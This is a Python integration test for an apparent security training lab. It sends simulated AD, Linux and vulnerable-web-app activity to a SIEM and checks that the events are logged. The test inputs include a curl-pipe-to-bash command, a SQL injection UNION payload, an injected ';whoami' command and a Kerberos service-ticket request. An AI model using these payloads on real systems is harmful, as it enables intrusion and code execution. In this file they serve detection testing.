"""Integration tests for end-to-end laboratory lifecycle and telemetry flow."""

from fastapi.testclient import TestClient
from src.infra.ad_directory.server import ActiveDirectoryServer
from src.infra.linux_server.service import LinuxServerService
from src.siem.app import create_siem_app
from src.siem.collector import SIEMCollector
from src.siem.models import EventCategory, EventQuery
from src.siem.storage import EventStore
from src.vulnapp.app import create_app
from src.vulnapp.telemetry import AppTelemetryClient


def test_full_cross_service_telemetry_lifecycle():
    # 1. Initialize central SIEM
    store = EventStore()
    siem = SIEMCollector(store=store)
    siem_app = create_siem_app()
    # Inject active store into SIEM app state for query
    siem_client = TestClient(siem_app)

    # 2. Initialize AD & Linux infrastructure wired to SIEM
    ad = ActiveDirectoryServer(siem_collector=siem)
    linux = LinuxServerService(siem_collector=siem)

    # 3. Initialize Vulnerable Web Portal wired to SIEM
    app_telemetry = AppTelemetryClient(local_collector=siem)
    app = create_app(
        database_url="sqlite:///:memory:",
        telemetry_client=app_telemetry,
        enable_vulnerabilities=True,
    )
    app_client = TestClient(app)

    # 4. Trigger actions across multiple tiers
    # Tier A: Active Directory Auth & Kerberos
    ad.authenticate_user("jdoe", "LabPassword123!")
    ad.authenticate_user("jdoe", "WrongPass")
    ad.request_kerberos_tgs("jdoe", "MSSQLSvc/db01.corp.enterprise.local:1433")

    # Tier B: Linux Server SSH & Command Exec
    linux.simulate_ssh_login("sysadmin", password="LinuxAdminLab2026!")
    linux.simulate_command_execution("sysadmin", "curl -s http://internal/script.sh | bash")

    # Tier C: Vulnerable Web Portal Queries
    app_client.get("/api/v1/employees/search?query=' UNION SELECT 1,2,3,4,5,6,7,8 --")
    app_client.post("/api/v1/tools/ping", json={"target": "127.0.0.1; whoami"})
    app_client.get("/api/v1/documents/DOC-9003?user_id=1")

    # 5. Verify SIEM aggregated all events
    total_events = store.count()
    assert total_events >= 8, f"Expected >= 8 events, got {total_events}"

    stats = store.get_stats()
    assert "authentication" in stats["by_category"]
    assert "process" in stats["by_category"]
    assert "database" in stats["by_category"]

    # 6. Test Store Reset / Teardown
    store.clear()
    assert store.count() == 0
